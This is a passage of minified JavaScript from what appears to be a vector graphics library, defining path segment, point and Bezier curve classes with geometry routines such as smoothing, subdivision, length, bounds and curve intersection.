                return t ? (e > 0 && !t._closed && e === t._segments.length - 1 && e--, t.getCurves()[e] || null) : null;
            },
            getLocation: function () {
                var t = this.getCurve();
                return t ? new z(t, this === t._segment1 ? 0 : 1) : null;
            },
            getNext: function () {
                var t = this._path && this._path._segments;
                return (t && (t[this._index + 1] || (this._path._closed && t[0]))) || null;
            },
            smooth: function (t, i, n) {
                var s = t || {},
                    r = s.type,
                    o = s.factor,
                    a = this.getPrevious(),
                    l = this.getNext(),
                    h = (a || this)._point,
                    u = this._point,
                    d = (l || this)._point,
                    f = h.getDistance(u),
                    p = u.getDistance(d);
                if (r && "catmull-rom" !== r) {
                    if ("geometric" !== r) throw new Error("Smoothing method '" + r + "' not supported.");
                    if (a && l) {
                        var g = h.subtract(d),
                            v = o === e ? 0.4 : o,
                            m = (v * f) / (f + p);
                        i || this.setHandleIn(g.multiply(m)), n || this.setHandleOut(g.multiply(m - v));
                    }
                } else {
                    var _ = o === e ? 0.5 : o,
                        y = Math.pow(f, _),
                        w = y * y,
                        x = Math.pow(p, _),
                        b = x * x;
                    if (!i && a) {
                        var S = 2 * b + 3 * x * y + w,
                            C = 3 * x * (x + y);
                        this.setHandleIn(0 !== C ? new c((b * h._x + S * u._x - w * d._x) / C - u._x, (b * h._y + S * u._y - w * d._y) / C - u._y) : new c());
                    }
                    if (!n && l) {
                        (S = 2 * w + 3 * y * x + b), (C = 3 * y * (y + x));
                        this.setHandleOut(0 !== C ? new c((w * d._x + S * u._x - b * h._x) / C - u._x, (w * d._y + S * u._y - b * h._y) / C - u._y) : new c());
                    }
                }
            },
            getPrevious: function () {
                var t = this._path && this._path._segments;
                return (t && (t[this._index - 1] || (this._path._closed && t[t.length - 1]))) || null;
            },
            isFirst: function () {
                return !this._index;
            },
            isLast: function () {
                var t = this._path;
                return (t && this._index === t._segments.length - 1) || !1;
            },
            reverse: function () {
                var t = this._handleIn,
                    e = this._handleOut,
                    i = t.clone();
                t.set(e), e.set(i);
            },
            reversed: function () {
                return new O(this._point, this._handleOut, this._handleIn);
            },
            remove: function () {
                return !!this._path && !!this._path.removeSegment(this._index);
            },
            clone: function () {
                return new O(this._point, this._handleIn, this._handleOut);
            },
            equals: function (t) {
                return t === this || (t && this._class === t._class && this._point.equals(t._point) && this._handleIn.equals(t._handleIn) && this._handleOut.equals(t._handleOut)) || !1;
            },
            toString: function () {
                var t = ["point: " + this._point];
                return this._handleIn.isZero() || t.push("handleIn: " + this._handleIn), this._handleOut.isZero() || t.push("handleOut: " + this._handleOut), "{ " + t.join(", ") + " }";
            },
            transform: function (t) {
                this._transformCoordinates(t, new Array(6), !0), this._changed();
            },
            interpolate: function (t, e, i) {
                var n = 1 - i,
                    s = i,
                    r = t._point,
                    o = e._point,
                    a = t._handleIn,
                    l = e._handleIn,
                    h = e._handleOut,
                    u = t._handleOut;
                this._point._set(n * r._x + s * o._x, n * r._y + s * o._y, !0), this._handleIn._set(n * a._x + s * l._x, n * a._y + s * l._y, !0), this._handleOut._set(n * u._x + s * h._x, n * u._y + s * h._y, !0), this._changed();
            },
            _transformCoordinates: function (t, e, i) {
                var n = this._point,
                    s = i && this._handleIn.isZero() ? null : this._handleIn,
                    r = i && this._handleOut.isZero() ? null : this._handleOut,
                    o = n._x,
                    a = n._y,
                    l = 2;
                return (
                    (e[0] = o),
                    (e[1] = a),
                    s && ((e[l++] = s._x + o), (e[l++] = s._y + a)),
                    r && ((e[l++] = r._x + o), (e[l++] = r._y + a)),
                    t &&
                        (t._transformCoordinates(e, e, l / 2),
                        (o = e[0]),
                        (a = e[1]),
                        i ? ((n._x = o), (n._y = a), (l = 2), s && ((s._x = e[l++] - o), (s._y = e[l++] - a)), r && ((r._x = e[l++] - o), (r._y = e[l++] - a))) : (s || ((e[l++] = o), (e[l++] = a)), r || ((e[l++] = o), (e[l++] = a)))),
                    e
                );
            },
        }),
        P = c.extend({
            initialize: function (t, i, n) {
                var s, r, o;
                if (t)
                    if ((s = t[0]) !== e) r = t[1];
                    else {
                        var a = t;
                        (s = a.x) === e && (s = (a = c.read(arguments)).x), (r = a.y), (o = a.selected);
                    }
                else s = r = 0;
                (this._x = s), (this._y = r), (this._owner = i), (i[n] = this), o && this.setSelected(!0);
            },
            _set: function (t, e) {
                return (this._x = t), (this._y = e), this._owner._changed(this), this;
            },
            getX: function () {
                return this._x;
            },
            setX: function (t) {
                (this._x = t), this._owner._changed(this);
            },
            getY: function () {
                return this._y;
            },
            setY: function (t) {
                (this._y = t), this._owner._changed(this);
            },
            isZero: function () {
                var t = h.isZero;
                return t(this._x) && t(this._y);
            },
            isSelected: function () {
                return !!(this._owner._selection & this._getSelection());
            },
            setSelected: function (t) {
                this._owner._changeSelection(this._getSelection(), t);
            },
            _getSelection: function () {
                var t = this._owner;
                return this === t._point ? 1 : this === t._handleIn ? 2 : this === t._handleOut ? 4 : 0;
            },
        }),
        M = s.extend(
            {
                _class: "Curve",
                beans: !0,
                initialize: function (t, e, i, n, s, r, o, a) {
                    var l,
                        h,
                        u,
                        c,
                        d,
                        f,
                        p = arguments.length;
                    3 === p
                        ? ((this._path = t), (l = e), (h = i))
                        : p
                        ? 1 === p
                            ? "segment1" in t
                                ? ((l = new O(t.segment1)), (h = new O(t.segment2)))
                                : "point1" in t
                                ? ((u = t.point1), (d = t.handle1), (f = t.handle2), (c = t.point2))
                                : Array.isArray(t) && ((u = [t[0], t[1]]), (c = [t[6], t[7]]), (d = [t[2] - t[0], t[3] - t[1]]), (f = [t[4] - t[6], t[5] - t[7]]))
                            : 2 === p
                            ? ((l = new O(t)), (h = new O(e)))
                            : 4 === p
                            ? ((u = t), (d = e), (f = i), (c = n))
                            : 8 === p && ((u = [t, e]), (c = [o, a]), (d = [i - t, n - e]), (f = [s - o, r - a]))
                        : ((l = new O()), (h = new O())),
                        (this._segment1 = l || new O(u, null, d)),
                        (this._segment2 = h || new O(c, f, null));
                },
                _serialize: function (t, e) {
                    return s.serialize(this.hasHandles() ? [this.getPoint1(), this.getHandle1(), this.getHandle2(), this.getPoint2()] : [this.getPoint1(), this.getPoint2()], t, !0, e);
                },
                _changed: function () {
                    this._length = this._bounds = e;
                },
                clone: function () {
                    return new M(this._segment1, this._segment2);
                },
                toString: function () {
                    var t = ["point1: " + this._segment1._point];
                    return (
                        this._segment1._handleOut.isZero() || t.push("handle1: " + this._segment1._handleOut),
                        this._segment2._handleIn.isZero() || t.push("handle2: " + this._segment2._handleIn),
                        t.push("point2: " + this._segment2._point),
                        "{ " + t.join(", ") + " }"
                    );
                },
                classify: function () {
                    return M.classify(this.getValues());
                },
                remove: function () {
                    var t = !1;
                    if (this._path) {
                        var e = this._segment2,
                            i = e._handleOut;
                        (t = e.remove()) && this._segment1._handleOut.set(i);
                    }
                    return t;
                },
                getPoint1: function () {
                    return this._segment1._point;
                },
                setPoint1: function () {
                    this._segment1._point.set(c.read(arguments));
                },
                getPoint2: function () {
                    return this._segment2._point;
                },
                setPoint2: function () {
                    this._segment2._point.set(c.read(arguments));
                },
                getHandle1: function () {
                    return this._segment1._handleOut;
                },
                setHandle1: function () {
                    this._segment1._handleOut.set(c.read(arguments));
                },
                getHandle2: function () {
                    return this._segment2._handleIn;
                },
                setHandle2: function () {
                    this._segment2._handleIn.set(c.read(arguments));
                },
                getSegment1: function () {
                    return this._segment1;
                },
                getSegment2: function () {
                    return this._segment2;
                },
                getPath: function () {
                    return this._path;
                },
                getIndex: function () {
                    return this._segment1._index;
                },
                getNext: function () {
                    var t = this._path && this._path._curves;
                    return (t && (t[this._segment1._index + 1] || (this._path._closed && t[0]))) || null;
                },
                getPrevious: function () {
                    var t = this._path && this._path._curves;
                    return (t && (t[this._segment1._index - 1] || (this._path._closed && t[t.length - 1]))) || null;
                },
                isFirst: function () {
                    return !this._segment1._index;
                },
                isLast: function () {
                    var t = this._path;
                    return (t && this._segment1._index === t._curves.length - 1) || !1;
                },
                isSelected: function () {
                    return this.getPoint1().isSelected() && this.getHandle1().isSelected() && this.getHandle2().isSelected() && this.getPoint2().isSelected();
                },
                setSelected: function (t) {
                    this.getPoint1().setSelected(t), this.getHandle1().setSelected(t), this.getHandle2().setSelected(t), this.getPoint2().setSelected(t);
                },
                getValues: function (t) {
                    return M.getValues(this._segment1, this._segment2, t);
                },
                getPoints: function () {
                    for (var t = this.getValues(), e = [], i = 0; i < 8; i += 2) e.push(new c(t[i], t[i + 1]));
                    return e;
                },
            },
            {
                getLength: function () {
                    return null == this._length && (this._length = M.getLength(this.getValues(), 0, 1)), this._length;
                },
                getArea: function () {
                    return M.getArea(this.getValues());
                },
                getLine: function () {
                    return new _(this._segment1._point, this._segment2._point);
                },
                getPart: function (t, e) {
                    return new M(M.getPart(this.getValues(), t, e));
                },
                getPartLength: function (t, e) {
                    return M.getLength(this.getValues(), t, e);
                },
                divideAt: function (t) {
                    return this.divideAtTime(t && t.curve === this ? t.time : this.getTimeAt(t));
                },
                divideAtTime: function (t, e) {
                    var i = null;
                    if (t >= 1e-8 && t <= 1 - 1e-8) {
                        var n = M.subdivide(this.getValues(), t),
                            s = n[0],
                            r = n[1],
                            o = e || this.hasHandles(),
                            a = this._segment1,
                            l = this._segment2,
                            h = this._path;
                        o && (a._handleOut._set(s[2] - s[0], s[3] - s[1]), l._handleIn._set(r[4] - r[6], r[5] - r[7]));
                        var u = s[6],
                            d = s[7],
                            f = new O(new c(u, d), o && new c(s[4] - u, s[5] - d), o && new c(r[2] - u, r[3] - d));
                        h ? (h.insert(a._index + 1, f), (i = this.getNext())) : ((this._segment2 = f), this._changed(), (i = new M(f, l)));
                    }
                    return i;
                },
                splitAt: function (t) {
                    var e = this._path;
                    return e ? e.splitAt(t) : null;
                },
                splitAtTime: function (t) {
                    return this.splitAt(this.getLocationAtTime(t));
                },
                divide: function (t, i) {
                    return this.divideAtTime(t === e ? 0.5 : i ? t : this.getTimeAt(t));
                },
                split: function (t, i) {
                    return this.splitAtTime(t === e ? 0.5 : i ? t : this.getTimeAt(t));
                },
                reversed: function () {
                    return new M(this._segment2.reversed(), this._segment1.reversed());
                },
                clearHandles: function () {
                    this._segment1._handleOut._set(0, 0), this._segment2._handleIn._set(0, 0);
                },
                statics: {
                    getValues: function (t, e, i, n) {
                        var s = t._point,
                            r = t._handleOut,
                            o = e._handleIn,
                            a = e._point,
                            l = s.x,
                            h = s.y,
                            u = a.x,
                            c = a.y,
                            d = n ? [l, h, l, h, u, c, u, c] : [l, h, l + r._x, h + r._y, u + o._x, c + o._y, u, c];
                        return i && i._transformCoordinates(d, d, 4), d;
                    },
                    subdivide: function (t, i) {
                        var n = t[0],
                            s = t[1],
                            r = t[2],
                            o = t[3],
                            a = t[4],
                            l = t[5],
                            h = t[6],
                            u = t[7];
                        i === e && (i = 0.5);
                        var c = 1 - i,
                            d = c * n + i * r,
                            f = c * s + i * o,
                            p = c * r + i * a,
                            g = c * o + i * l,
                            v = c * a + i * h,
                            m = c * l + i * u,
                            _ = c * d + i * p,
                            y = c * f + i * g,
                            w = c * p + i * v,
                            x = c * g + i * m,
                            b = c * _ + i * w,
                            S = c * y + i * x;
                        return [
                            [n, s, d, f, _, y, b, S],
                            [b, S, w, x, v, m, h, u],
                        ];
                    },
                    getMonoCurves: function (t, e) {
                        var i = [],
                            n = e ? 0 : 1,
                            s = t[n + 0],
                            r = t[n + 2],
                            o = t[n + 4],
                            a = t[n + 6];
                        if ((s >= r == r >= o && r >= o == o >= a) || M.isStraight(t)) i.push(t);
                        else {
                            var l = 3 * (r - o) - s + a,
                                u = 2 * (s + o) - 4 * r,
                                c = r - s,
                                d = [],
                                f = h.solveQuadratic(l, u, c, d, 1e-8, 1 - 1e-8);
                            if (f) {
                                d.sort();
                                var p = d[0],
                                    g = M.subdivide(t, p);
                                i.push(g[0]), f > 1 && ((p = (d[1] - p) / (1 - p)), (g = M.subdivide(g[1], p)), i.push(g[0])), i.push(g[1]);
                            } else i.push(t);
                        }
                        return i;
                    },
                    solveCubic: function (t, e, i, n, s, r) {
                        var o = t[e],
                            a = t[e + 2],
                            l = t[e + 4],
                            u = t[e + 6],
                            c = 0;
                        if (!((o < i && u < i && a < i && l < i) || (o > i && u > i && a > i && l > i))) {
                            var d = 3 * (a - o),
                                f = 3 * (l - a) - d,
                                p = u - o - d - f;
                            c = h.solveCubic(p, f, d, o - i, n, s, r);
                        }
                        return c;
                    },
                    getTimeOf: function (t, e) {
                        var i = new c(t[0], t[1]),
                            n = new c(t[6], t[7]);
                        if (null === (e.isClose(i, 1e-12) ? 0 : e.isClose(n, 1e-12) ? 1 : null))
                            for (var s = [e.x, e.y], r = [], o = 0; o < 2; o++)
                                for (var a = M.solveCubic(t, o, s[o], r, 0, 1), l = 0; l < a; l++) {
                                    var h = r[l];
                                    if (e.isClose(M.getPoint(t, h), 1e-7)) return h;
                                }
                        return e.isClose(i, 1e-7) ? 0 : e.isClose(n, 1e-7) ? 1 : null;
                    },
                    getNearestTime: function (t, e) {
                        if (M.isStraight(t)) {
                            var i = t[0],
                                n = t[1],
                                s = t[6] - i,
                                r = t[7] - n,
                                o = s * s + r * r;
                            if (0 === o) return 0;
                            var a = ((e.x - i) * s + (e.y - n) * r) / o;
                            return a < 1e-12 ? 0 : a > 0.999999999999 ? 1 : M.getTimeOf(t, new c(i + a * s, n + a * r));
                        }
                        var l = 1 / 0,
                            h = 0;
                        function u(i) {
                            if (i >= 0 && i <= 1) {
                                var n = e.getDistance(M.getPoint(t, i), !0);
                                if (n < l) return (l = n), (h = i), !0;
                            }
                        }
                        for (var d = 0; d <= 100; d++) u(d / 100);
                        for (var f = 0.005; f > 1e-8; ) u(h - f) || u(h + f) || (f /= 2);
                        return h;
                    },
                    getPart: function (t, e, i) {
                        var n = e > i;
                        if (n) {
                            var s = e;
                            (e = i), (i = s);
                        }
                        return e > 0 && (t = M.subdivide(t, e)[1]), i < 1 && (t = M.subdivide(t, (i - e) / (1 - e))[0]), n ? [t[6], t[7], t[4], t[5], t[2], t[3], t[0], t[1]] : t;
                    },
                    isFlatEnough: function (t, e) {
                        var i = t[0],
                            n = t[1],
                            s = t[2],
                            r = t[3],
                            o = t[4],
                            a = t[5],
                            l = t[6],
                            h = t[7],
                            u = 3 * s - 2 * i - l,
                            c = 3 * r - 2 * n - h,
                            d = 3 * o - 2 * l - i,
                            f = 3 * a - 2 * h - n;
                        return Math.max(u * u, d * d) + Math.max(c * c, f * f) <= 16 * e * e;
                    },
                    getArea: function (t) {
                        var e = t[0],
                            i = t[1],
                            n = t[2],
                            s = t[3],
                            r = t[4],
                            o = t[5],
                            a = t[6],
                            l = t[7];
                        return (3 * ((l - i) * (n + r) - (a - e) * (s + o) + s * (e - r) - n * (i - o) + l * (r + e / 3) - a * (o + i / 3))) / 20;
                    },
                    getBounds: function (t) {
                        for (var e = t.slice(0, 2), i = e.slice(), n = [0, 0], s = 0; s < 2; s++) M._addBounds(t[s], t[s + 2], t[s + 4], t[s + 6], s, 0, e, i, n);
                        return new g(e[0], e[1], i[0] - e[0], i[1] - e[1]);
                    },
                    _addBounds: function (t, e, i, n, s, r, o, a, l) {
                        function u(t, e) {
                            var i = t - e,
                                n = t + e;
                            i < o[s] && (o[s] = i), n > a[s] && (a[s] = n);
                        }
                        r /= 2;
                        var c = o[s] - r,
                            d = a[s] + r;
                        if (t < c || e < c || i < c || n < c || t > d || e > d || i > d || n > d)
                            if (e < t != e < n && i < t != i < n) u(t, r), u(n, r);
                            else {
                                var f = 3 * (e - i) - t + n,
                                    p = 2 * (t + i) - 4 * e,
                                    g = e - t,
                                    v = h.solveQuadratic(f, p, g, l);
                                u(n, 0);
                                for (var m = 0; m < v; m++) {
                                    var _ = l[m],
                                        y = 1 - _;
                                    1e-8 <= _ && _ <= 1 - 1e-8 && u(y * y * y * t + 3 * y * y * _ * e + 3 * y * _ * _ * i + _ * _ * _ * n, r);
                                }
                            }
                    },
                },
            },
            s.each(
                ["getBounds", "getStrokeBounds", "getHandleBounds"],
                function (t) {
                    this[t] = function () {
                        this._bounds || (this._bounds = {});
                        var e = this._bounds[t];
                        return e || (e = this._bounds[t] = E[t]([this._segment1, this._segment2], !1, this._path)), e.clone();
                    };
                },
                {}
            ),
            s.each(
                {
                    isStraight: function (t, e, i, n) {
                        if (e.isZero() && i.isZero()) return !0;
                        var s = n.subtract(t);
                        if (s.isZero()) return !1;
                        if (s.isCollinear(e) && s.isCollinear(i)) {
                            var r = new _(t, n);
                            if (r.getDistance(t.add(e)) < 1e-7 && r.getDistance(n.add(i)) < 1e-7) {
                                var o = s.dot(s),
                                    a = s.dot(e) / o,
                                    l = s.dot(i) / o;
                                return a >= 0 && a <= 1 && l <= 0 && l >= -1;
                            }
                        }
                        return !1;
                    },
                    isLinear: function (t, e, i, n) {
                        var s = n.subtract(t).divide(3);
                        return e.equals(s) && i.negate().equals(s);
                    },
                },
                function (t, e) {
                    (this[e] = function (e) {
                        var i = this._segment1,
                            n = this._segment2;
                        return t(i._point, i._handleOut, n._handleIn, n._point, e);
                    }),
                        (this.statics[e] = function (e, i) {
                            var n = e[0],
                                s = e[1],
                                r = e[6],
                                o = e[7];
                            return t(new c(n, s), new c(e[2] - n, e[3] - s), new c(e[4] - r, e[5] - o), new c(r, o), i);
                        });
                },
                {
                    statics: {},
                    hasHandles: function () {
                        return !this._segment1._handleOut.isZero() || !this._segment2._handleIn.isZero();
                    },
                    hasLength: function (t) {
                        return (!this.getPoint1().equals(this.getPoint2()) || this.hasHandles()) && this.getLength() > (t || 0);
                    },
                    isCollinear: function (t) {
                        return t && this.isStraight() && t.isStraight() && this.getLine().isCollinear(t.getLine());
                    },
                    isHorizontal: function () {
                        return this.isStraight() && Math.abs(this.getTangentAtTime(0.5).y) < 1e-8;
                    },
                    isVertical: function () {
                        return this.isStraight() && Math.abs(this.getTangentAtTime(0.5).x) < 1e-8;
                    },
                }
            ),
            {
                beans: !1,
                getLocationAt: function (t, e) {
                    return this.getLocationAtTime(e ? t : this.getTimeAt(t));
                },
                getLocationAtTime: function (t) {
                    return null != t && t >= 0 && t <= 1 ? new z(this, t) : null;
                },
                getTimeAt: function (t, e) {
                    return M.getTimeAt(this.getValues(), t, e);
                },
                getParameterAt: "#getTimeAt",
                getTimesWithTangent: function () {
                    var t = c.read(arguments);
                    return t.isZero() ? [] : M.getTimesWithTangent(this.getValues(), t);
                },
                getOffsetAtTime: function (t) {
                    return this.getPartLength(0, t);
                },
                getLocationOf: function () {
                    return this.getLocationAtTime(this.getTimeOf(c.read(arguments)));
                },
                getOffsetOf: function () {
                    var t = this.getLocationOf.apply(this, arguments);
                    return t ? t.getOffset() : null;
                },
                getTimeOf: function () {
                    return M.getTimeOf(this.getValues(), c.read(arguments));
                },
                getParameterOf: "#getTimeOf",
                getNearestLocation: function () {
                    var t = c.read(arguments),
                        e = this.getValues(),
                        i = M.getNearestTime(e, t),
                        n = M.getPoint(e, i);
                    return new z(this, i, n, null, t.getDistance(n));
                },
                getNearestPoint: function () {
                    var t = this.getNearestLocation.apply(this, arguments);
                    return t ? t.getPoint() : t;
                },
            },
            new (function () {
                var t = ["getPoint", "getTangent", "getNormal", "getWeightedTangent", "getWeightedNormal", "getCurvature"];
                return s.each(
                    t,
                    function (t) {
                        (this[t + "At"] = function (e, i) {
                            var n = this.getValues();
                            return M[t](n, i ? e : M.getTimeAt(n, e));
                        }),
                            (this[t + "AtTime"] = function (e) {
                                return M[t](this.getValues(), e);
                            });
                    },
                    { statics: { _evaluateMethods: t } }
                );
            })(),
            new (function () {
                function t(t) {
                    var e = t[0],
                        i = t[1],
                        n = t[2],
                        s = t[3],
                        r = t[4],
                        o = t[5],
                        a = t[6],
                        l = t[7],
                        h = 9 * (n - r) + 3 * (a - e),
                        u = 6 * (e + r) - 12 * n,
                        c = 3 * (n - e),
                        d = 9 * (s - o) + 3 * (l - i),
                        f = 6 * (i + o) - 12 * s,
                        p = 3 * (s - i);
                    return function (t) {
                        var e = (h * t + u) * t + c,
                            i = (d * t + f) * t + p;
                        return Math.sqrt(e * e + i * i);
                    };
                }
                function i(t, e) {
                    return Math.max(2, Math.min(16, Math.ceil(32 * Math.abs(e - t))));
                }
                function n(t, e, i, n) {
                    if (null == e || e < 0 || e > 1) return null;
                    var s = t[0],
                        r = t[1],
                        o = t[2],
                        a = t[3],
                        l = t[4],
                        u = t[5],
                        d = t[6],
                        f = t[7],
                        p = h.isZero;
                    p(o - s) && p(a - r) && ((o = s), (a = r)), p(l - d) && p(u - f) && ((l = d), (u = f));
                    var g,
                        v,
                        m = 3 * (o - s),
                        _ = 3 * (l - o) - m,
                        y = d - s - m - _,
                        w = 3 * (a - r),
                        x = 3 * (u - a) - w,
                        b = f - r - w - x;
                    if (0 === i) (g = 0 === e ? s : 1 === e ? d : ((y * e + _) * e + m) * e + s), (v = 0 === e ? r : 1 === e ? f : ((b * e + x) * e + w) * e + r);
                    else {
                        if ((e < 1e-8 ? ((g = m), (v = w)) : e > 1 - 1e-8 ? ((g = 3 * (d - l)), (v = 3 * (f - u))) : ((g = (3 * y * e + 2 * _) * e + m), (v = (3 * b * e + 2 * x) * e + w)), n)) {
                            0 === g && 0 === v && (e < 1e-8 || e > 1 - 1e-8) && ((g = l - o), (v = u - a));
                            var S = Math.sqrt(g * g + v * v);
                            S && ((g /= S), (v /= S));
                        }
                        if (3 === i) {
                            (l = 6 * y * e + 2 * _), (u = 6 * b * e + 2 * x);
                            var C = Math.pow(g * g + v * v, 1.5);
                            (g = 0 !== C ? (g * u - v * l) / C : 0), (v = 0);
                        }
                    }
                    return 2 === i ? new c(v, -g) : new c(g, v);
                }
                return {
                    statics: {
                        classify: function (t) {
                            var i = t[0],
                                n = t[1],
                                s = t[2],
                                r = t[3],
                                o = t[4],
                                a = t[5],
                                l = t[6],
                                u = t[7],
                                c = s * (n - u) + r * (l - i) + i * u - n * l,
                                d = 3 * (o * (r - n) + a * (i - s) + s * n - r * i),
                                f = d - c,
                                p = f - c + (i * (u - a) + n * (o - l) + l * a - u * o),
                                g = Math.sqrt(p * p + f * f + d * d),
                                v = 0 !== g ? 1 / g : 0,
                                m = h.isZero,
                                _ = "serpentine";
                            function y(t, i, n) {
                                var s = i !== e,
                                    r = s && i > 0 && i < 1,
                                    o = s && n > 0 && n < 1;
                                return !s || ((r || o) && ("loop" !== t || (r && o))) || ((t = "arch"), (r = o = !1)), { type: t, roots: r || o ? (r && o ? (i < n ? [i, n] : [n, i]) : [r ? i : n]) : null };
                            }
                            if (((f *= v), (d *= v), m((p *= v)))) return m(f) ? y(m(d) ? "line" : "quadratic") : y(_, d / (3 * f));
                            var w = 3 * f * f - 4 * p * d;
                            if (m(w)) return y("cusp", f / (2 * p));
                            var x = w > 0 ? Math.sqrt(w / 3) : Math.sqrt(-w),
                                b = 2 * p;
                            return y(w > 0 ? _ : "loop", (f + x) / b, (f - x) / b);
                        },
                        getLength: function (n, s, r, o) {
                            if ((s === e && (s = 0), r === e && (r = 1), M.isStraight(n))) {
                                var a = n;
                                r < 1 && ((a = M.subdivide(a, r)[0]), (s /= r)), s > 0 && (a = M.subdivide(a, s)[1]);
                                var l = a[6] - a[0],
                                    u = a[7] - a[1];
                                return Math.sqrt(l * l + u * u);
                            }
                            return h.integrate(o || t(n), s, r, i(s, r));
                        },
                        getTimeAt: function (n, s, r) {
                            if ((r === e && (r = s < 0 ? 1 : 0), 0 === s)) return r;
                            var o = Math.abs,
                                a = s > 0,
                                l = a ? r : 0,
                                u = a ? 1 : r,
                                c = t(n),
                                d = M.getLength(n, l, u, c),
                                f = o(s) - d;
                            if (o(f) < 1e-12) return a ? u : l;
                            if (f > 1e-12) return null;
                            var p = s / d,
                                g = 0;
                            return h.findRoot(
                                function (t) {
                                    return (g += h.integrate(c, r, t, i(r, t))), (r = t), g - s;
                                },
                                c,
                                r + p,
                                l,
                                u,
                                32,
                                1e-12
                            );
                        },
                        getPoint: function (t, e) {
                            return n(t, e, 0, !1);
                        },
                        getTangent: function (t, e) {
                            return n(t, e, 1, !0);
                        },
                        getWeightedTangent: function (t, e) {
                            return n(t, e, 1, !1);
                        },
                        getNormal: function (t, e) {
                            return n(t, e, 2, !0);
                        },
                        getWeightedNormal: function (t, e) {
                            return n(t, e, 2, !1);
                        },
                        getCurvature: function (t, e) {
                            return n(t, e, 3, !1).x;
                        },
                        getPeaks: function (t) {
                            var e = t[0],
                                i = t[1],
                                n = t[2],
                                s = t[3],
                                r = t[4],
                                o = t[5],
                                a = 3 * n - e - 3 * r + t[6],
                                l = 3 * e - 6 * n + 3 * r,
                                u = -3 * e + 3 * n,
                                c = 3 * s - i - 3 * o + t[7],
                                d = 3 * i - 6 * s + 3 * o,
                                f = -3 * i + 3 * s,
                                p = [];
                            return h.solveCubic(9 * (a * a + c * c), 9 * (a * l + d * c), 2 * (l * l + d * d) + 3 * (u * a + f * c), u * l + d * f, p, 1e-8, 1 - 1e-8), p.sort();
                        },
                    },
                };
            })(),
            new (function () {
                function t(t, e, i, n, s, r, o) {
                    var a = !o && i.getPrevious() === s,
                        l = !o && i !== s && i.getNext() === s;
                    if (null !== n && n >= (a ? 1e-8 : 0) && n <= (l ? 1 - 1e-8 : 1) && null !== r && r >= (l ? 1e-8 : 0) && r <= (a ? 1 - 1e-8 : 1)) {
                        var h = new z(i, n, null, o),
                            u = new z(s, r, null, o);
                        (h._intersection = u), (u._intersection = h), (e && !e(h)) || z.insert(t, h, !0);
                    }
                }
                function e(t, e, n, s) {
                    return t[0][1] < n ? i(t, !0, n) : e[0][1] > s ? i(e, !1, s) : t[0][0];
                }
                function i(t, e, i) {
                    for (var n = t[0][0], s = t[0][1], r = 1, o = t.length; r < o; r++) {
                        var a = t[r][0],
                            l = t[r][1];
                        if (e ? l >= i : l <= i) return l === i ? a : n + ((i - s) * (a - n)) / (l - s);
                        (n = a), (s = l);
                    }
                    return null;
                }
                function n(t, e, i, n, s) {
                    var r = h.isZero;
                    if (r(n) && r(s)) {
                        var o = M.getTimeOf(t, new c(e, i));
                        return null === o ? [] : [o];
                    }
                    for (var a = Math.atan2(-s, n), l = Math.sin(a), u = Math.cos(a), d = [], f = [], p = 0; p < 8; p += 2) {
                        var g = t[p] - e,
                            v = t[p + 1] - i;
                        d.push(g * u - v * l, g * l + v * u);
                    }
                    return M.solveCubic(d, 1, 0, f, 0, 1), f;
                }
                function r(i, s, r, o, l, h) {
                    var u = Math.min,
                        d = Math.max;
                    if (
                        d(i[0], i[2], i[4], i[6]) + 1e-12 > u(s[0], s[2], s[4], s[6]) &&
                        u(i[0], i[2], i[4], i[6]) - 1e-12 < d(s[0], s[2], s[4], s[6]) &&
                        d(i[1], i[3], i[5], i[7]) + 1e-12 > u(s[1], s[3], s[5], s[7]) &&
                        u(i[1], i[3], i[5], i[7]) - 1e-12 < d(s[1], s[3], s[5], s[7])
                    ) {
                        var f = a(i, s);
                        if (f)
                            for (var p = 0; p < 2; p++) {
                                var g = f[p];
                                t(l, h, r, g[0], o, g[1], !0);
                            }
                        else {
                            var v = M.isStraight(i),
                                m = M.isStraight(s),
                                y = v && m,
                                w = v && !m,
                                x = l.length;
                            if (
                                ((y
                                    ? function (e, i, n, s, r, o) {
                                          var a = _.intersect(e[0], e[1], e[6], e[7], i[0], i[1], i[6], i[7]);
                                          a && t(r, o, n, M.getTimeOf(e, a), s, M.getTimeOf(i, a));
                                      }
                                    : v || m
                                    ? function (e, i, s, r, o, a, l) {
                                          for (var h = i[0], u = i[1], c = n(e, h, u, i[6] - h, i[7] - u), d = 0, f = c.length; d < f; d++) {
                                              var p = c[d],
                                                  g = M.getPoint(e, p),
                                                  v = M.getTimeOf(i, g);
                                              null !== v && t(o, a, l ? r : s, l ? v : p, l ? s : r, l ? p : v);
                                          }
                                      }
                                    : function i(n, s, r, o, a, l, h, u, c, d, f, p, g) {
                                          if (++c >= 4096 || ++u >= 40) return c;
                                          var v,
                                              m,
                                              y = s[0],
                                              w = s[1],
                                              x = s[6],
                                              b = s[7],
                                              S = _.getSignedDistance,
                                              C = S(y, w, x, b, s[2], s[3]),
                                              T = S(y, w, x, b, s[4], s[5]),
                                              k = C * T > 0 ? 0.75 : 4 / 9,
                                              I = k * Math.min(0, C, T),
                                              O = k * Math.max(0, C, T),
                                              P = S(y, w, x, b, n[0], n[1]),
                                              z = S(y, w, x, b, n[2], n[3]),
                                              A = S(y, w, x, b, n[4], n[5]),
                                              E = S(y, w, x, b, n[6], n[7]),
                                              L = (function (t, e, i, n) {
                                                  var s,
                                                      r = [0, t],
                                                      o = [1 / 3, e],
                                                      a = [2 / 3, i],
                                                      l = [1, n],
                                                      h = e - (2 * t + n) / 3,
                                                      u = i - (t + 2 * n) / 3;
                                                  if (h * u < 0)
                                                      s = [
                                                          [r, o, l],
                                                          [r, a, l],
                                                      ];
                                                  else {
                                                      var c = h / u;
                                                      s = [c >= 2 ? [r, o, l] : c <= 0.5 ? [r, a, l] : [r, o, a, l], [r, l]];
                                                  }
                                                  return (h || u) < 0 ? s.reverse() : s;
                                              })(P, z, A, E),
                                              $ = L[0],
                                              j = L[1];
                                          if ((0 === C && 0 === T && 0 === P && 0 === z && 0 === A && 0 === E) || null == (v = e($, j, I, O)) || null == (m = e($.reverse(), j.reverse(), I, O))) return c;
                                          var D = d + (f - d) * v,
                                              N = d + (f - d) * m;
                                          if (Math.max(g - p, N - D) < 1e-9) {
                                              var F = (D + N) / 2,
                                                  B = (p + g) / 2;
                                              t(a, l, h ? o : r, h ? B : F, h ? r : o, h ? F : B);
                                          } else if (((n = M.getPart(n, v, m)), m - v > 0.8))
